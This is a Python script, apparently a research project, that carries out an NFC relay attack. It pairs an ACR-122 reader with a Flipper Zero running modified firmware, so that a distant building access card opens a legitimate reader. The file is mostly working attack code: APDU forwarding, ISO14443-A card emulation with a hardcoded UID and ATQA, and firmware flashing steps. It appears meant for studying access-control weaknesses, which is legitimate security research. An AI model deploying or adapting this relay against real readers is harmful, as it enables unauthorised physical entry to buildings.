### relay.py
'''
DISCLAIMER : This program was created for research and educational purposes only with 
    no warranty whatsoever.

Copyright (C) 2026 Solal TESSIER

Part of this code was inspired by Guillaume VINET (gvinet)'s 
example code for his python lib pynfcreader : examples/emu_flipper_zero_iso14443_a_relay.py

    Copyright (C) 2015-2024 Guillaume VINET
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.


Using the pyscard (smartcard) module, the goal is to simulate a NFC relay attack between
    a legitimate reader and a legitimate access card to grant access to a building
    without the access card being physically close to the reader using
    an ACR-122 and a FlipperZero with modded firmware by gvinet on GitHub. To run this,
    you will also need to download and compile the libnfc library.
I have forked gvinet's repo to add a few upgrades
    (https://github.com/Panostop/flipperzero-firmware-relay).



To set up the Flipper :
    - Plug it into the Raspberry Pi
    - run : 
        $ git clone "https://github.com/Panostop/flipperzero-firmware-relay.git" 
        $ cd flipperzero-firmware-relay

        # the following script can be used each time you need it, it cleans, compiles and flashes the flipper
        $ ./flasher

    - wait for the build and installation to finish on the Flipper (can take a while)

The ACR122 is not used twice because of restrictions in emulation mode.

For this program to work, you will need to call it with root privileges because of
    the pyscard module. To do so, if you use pyenv and because of pyenv shims, call 
    
    $ sudo $(which python) relay.py
    
    to avoid sudo using its own python environment


This is the physical setup expected (the Access Card must be placed before start):

    [Access Card].))  ((.[ACR-122U]---[RasPi]---[FlipperZero].))  ((.[Reader]

'''


import time
from typing import Tuple

from pynfcreader.sessions.iso14443.tpdu import Tpdu
from pynfcreader.devices import flipper_zero
from pynfcreader.sessions.iso14443.iso14443a import Iso14443ASession

from smartcard.System import readers
from smartcard.Exceptions import NoCardException, CardConnectionException

#we will need a shell to get the card's information
from subprocess import * 


class PCSCReader():
    def __init__(self, readername: str):
        self.readername = readername
        pass

    def connect(self):
        reader_list=readers() #list pc/sc readers

        # Display the list of readers
        print("Available PC/SC readers :\n")
        for i in range(len(reader_list)):
            print(f"\t-\t{reader_list[i].name}")
        print("")


        if not len(reader_list) == 1 or not self.readername in reader_list[0].name:
            print(f"Need exactly 1 {self.readername} to continue, {len(reader_list)} readers available.")
            exit(1)
        
        #Card Connection
        self.connection = reader_list[0].createConnection() # initialize reader connection
        try :
            self.connection.connect()
        except NoCardException: #raised if no card is resent on the reader
            print("No card on the connected reader")
            exit(4173)
        except CardConnectionException:
            print("retrying in a bit")
            time.sleep(1)
            self.connect()
        
    def process_apdu(self, data_to_send: bytes) -> bytes:
        print(f"apdu cmd: {data_to_send.hex()}")

        #send data to the card
        data_received, sw1, sw2 = self.connection.transmit(list(data_to_send))
        resp = bytes(data_received + [sw1, sw2])
        print(f"apdu resp: {resp.hex()}")
        return resp

def getCardInfo() -> list[str]:
    """
    Uses the libnfc C library to gather UID, ATQA and SAK from the card.
    """
    
    # Used files for better clarity and because of issues with pipes
    with open("CardInfo.txt", "w") as CardInfo:
        
        # returns the full card info
        CardInfoCatcher = Popen( ["nfc-list"], 
                        stdout=CardInfo,
                        stderr=PIPE,
                        )
        CardInfoCatcher.communicate() #wait for the output, it often takes a bit
        
    
    with open("CardInfo.txt", "r") as CardInfo:
        CardInfoLines = [line.rstrip() for line in CardInfo] #load the file in a list
        
        #iloveonelinersfromhell
        # keep only the second half for the lines we need (the actual values after the ': ')
        # then remove the spaces
        CardInfoLines = [''.join(CardInfoLines[i].split(': ')[1].split(' ')) for i in range(3, 6)]
        print(CardInfoLines)
    
    # ATQA / UID / SAK
    return CardInfoLines

class Emu(Iso14443ASession):

    def __init__(self, cid=0, nad=0, drv=None, block_size=16, reader=None):
        Iso14443ASession.__init__(self, cid, nad, drv, block_size)
        self._addCID = False
        self.drv = self._drv
        self._pcb_block_number: int = 1
        # Set to one for an ICC
        self._iblock_pcb_number = 1
        self.iblock_resp_lst = []
        self.reader = reader
        if self.reader:
            self.reader.connect()
        else:
            print("No reader initialized for this emulator")
            exit(7143)

    def run(self):
        self.drv.start_emulation()
        print("...go!")
        self.low_level_dispatcher()

    def rblock_process(self, tpdu: Tpdu) -> Tuple[str, bool]:
        print("r block")
        if tpdu.tpdu == b"\xBA\x00\xBE\xD9": #rare situation observed, might not be useful for you
            rtpdu, crc = "BA00", True
        
        elif tpdu.tpdu == b"\xBB\x00\x66\xC0": #rare case observed, might not be useful for you
            rtpdu, crc = "BB00", True

        elif tpdu.pcb in [0xA2, 0xA3, 0xB2, 0xB3]:
            if len(self.iblock_resp_lst):
                rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
            else:
                rtpdu = self.build_rblock(ack=True).hex()
                crc = True
        else:
            rtpdu, crc = None, False
        

        return rtpdu, crc


    def process_apdu(self, apdu):
        return self.reader.process_apdu(apdu)
        

    def low_level_dispatcher(self):
        capdu = bytes()
        ats_sent = False

        iblock_resp_lst = []

        while 1:
            received = self.drv.emu_get_cmd()
            rtpdu = None
            print(f"tpdu < {received}")

            if received == "off":
                print("field off")
            elif received == "on":
                print("field on")
                ats_sent = False
            else:
                tpdu = Tpdu(bytes.fromhex(received))
                
                if received == 'D0110052A6':
                    rtpdu, crc = 'D0', True
                elif received == '500057CD':
                    rtpdu, crc = "", False
                    print("EOC")
                elif (tpdu.tpdu[0] == 0xE0) and (ats_sent is False):
                    rtpdu, crc = "067577810280", True # l'ATS 
                    ats_sent = True

                elif tpdu.r:
                    rtpdu, crc = self.rblock_process(tpdu)
                
                elif tpdu.s:
                    print("s block")
                    # Deselect
                    if len(tpdu._inf_field) == 0:
                        rtpdu, crc = "C2E0B4", False
                    # Otherwise, it is a WTX

                elif tpdu.i:
                    print("i block")
                    capdu += tpdu.inf
                    if tpdu.is_chaining() is False:
                        rapdu = self.process_apdu(capdu)
                        capdu = bytes()
                        self.iblock_resp_lst = self.chaining_iblock(data=rapdu)
                        rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True

                print(f">>> rtdpu {rtpdu}\n")
                if rtpdu == "":
                    self.drv.emu_send_resp(b"\x09", crc)
                    exit(7143)
                else:
                    self.drv.emu_send_resp(bytes.fromhex(rtpdu), crc)

#initialize the FlipperZero instance and connection
flipper = flipper_zero.FlipperZero("", debug=False)
flipper.connect()
flipper.set_mode_emu_iso14443A()

"""
card_info = getCardInfo() # [ATQA, UID, SAK]
print(f"This card will be emulated :\
      \n\t - ATQA : {card_info[0]}\
      \n\t - UID  : {card_info[1]}\
      \n\t - SAK  : {card_info[2]}")
"""
flipper.set_atqa("4403")
flipper.set_uid("0433303A871690")
#flipper.set_sak("20") #je n'ai pas réussi à le faire fonctionner


pcsc_reader = PCSCReader('ACR122') #initialize the reader and card connection
emu = Emu(drv=flipper, reader=pcsc_reader)
emu.run()

